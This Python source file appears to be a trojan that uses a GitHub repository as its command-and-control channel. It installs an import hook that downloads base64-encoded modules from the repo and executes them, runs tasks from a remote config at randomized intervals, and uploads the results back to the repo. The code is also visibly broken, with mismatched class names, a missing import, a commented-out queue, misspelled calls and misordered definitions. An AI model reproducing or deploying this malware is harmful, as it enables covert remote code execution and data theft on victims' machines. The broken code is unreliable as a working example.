import json
import base64
import sys
import time
import random
import threading
from queue import *
import os

import github3 

trojan_id = 'qwerty'

trojan_config = "%s.json" % trojan_id

data_path  = "data/%s/" % trojan_id

trojan_modules = []

configured = False

# task_queue = Queue.queue()

class gitImport(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self,fullname,path=None):
        if configured:
            print("Attempting to retrieve %s" % fullname)
            new_lib = get_file_contents("modules/%s" % fullname)

            if new_lib is not None:
                self.current_module_code = base64.b64decode(new_lib)
                return self

        return None

    def load_mod(self,name):
        module = imp.new_module(name)
        exec(self.current_module_code in module._dict_)
        sys.modules[name] = module

        return module


    
def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)
    return

sys.meta_path = [Gitimporter()]

while True:
    if task_queue.empty():

        config = get_trojan_config()

        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module']))
            t.start()
            time.sleep(random.randint(1,10))

        time.sleep(random.randint(1000,10000))











def conn_git():
    gh = login(username = "yourusername", password = "yourpassword")

    repo = gh.repository("yourusername","troy")
    branch = repo.branch("main")

    return gh,repo,branch


def get_file_contents(filepath):

    gh,repo,branch = conn_git()
    tree = branch.commit.commit.tree.recure()

    for filename  in tree.tree:

        if filepath in filename.path:
            print (" > Got the file %s" %filepath)

            blob = repo.blob(filename._json_data['sha'])
            return blob.content 

    return None


def get_trojan_config():
    global configured
    config_json  = get_file_contents(trojan_config)
    config       = json.loads(base64.base64decode(config_json))
    configured    = True


    for task in config:

        if task['module'] not in sys.modules:

            exec("import %s"  % task['module'])

        return config


def store_module_result(data):

    gh,repo,branch = conn_git()

    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
    repo.create_file(remote_path, "Committ message", base64.b64encode(data))

    return

    
